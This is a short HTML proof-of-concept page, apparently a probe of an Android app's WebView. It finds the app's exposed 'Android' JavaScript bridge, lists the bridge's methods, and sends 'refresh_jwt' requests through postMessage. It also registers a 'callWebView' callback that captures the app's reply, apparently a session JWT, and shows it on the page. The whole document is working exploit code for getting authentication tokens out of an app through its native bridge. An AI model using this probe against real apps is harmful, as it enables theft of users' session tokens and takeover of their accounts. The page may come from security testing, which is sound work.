<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>JWT-PROBE</title></head>
<body style="background:#111;color:#0f0;font:14px monospace;padding:12px">
<pre id="log">boot</pre>
<div id="res" style="margin-top:8px;word-break:break-all"></div>
<script>
const log = (s) => { document.getElementById('log').textContent += '\n' + s; };
log('loaded ' + location.href);
function showRes(obj) {
  document.getElementById('res').textContent = JSON.stringify(obj).slice(0, 1200);
}
window.callWebView = (o) => { log('callWebView fired'); showRes(o); document.title = 'JWT-RESULT'; };
(function fire() {
  const A = window.Android;
  if (!A) { setTimeout(fire, 100); return; }
  log('Android: ' + Object.getOwnPropertyNames(Object.getPrototypeOf(A) || A).join(','));
  try {
    A.postMessage(JSON.stringify({name: 'refresh_jwt', data: {}}));
    log('sent {name: refresh_jwt}');
  } catch (e) { log('err1: ' + e); }
  setTimeout(() => {
    try { A.postMessage(JSON.stringify({action: 'refresh_jwt', data: {}})); log('sent {action: refresh_jwt}'); }
    catch (e) { log('err2: ' + e); }
  }, 3000);
})();
</script></body></html>
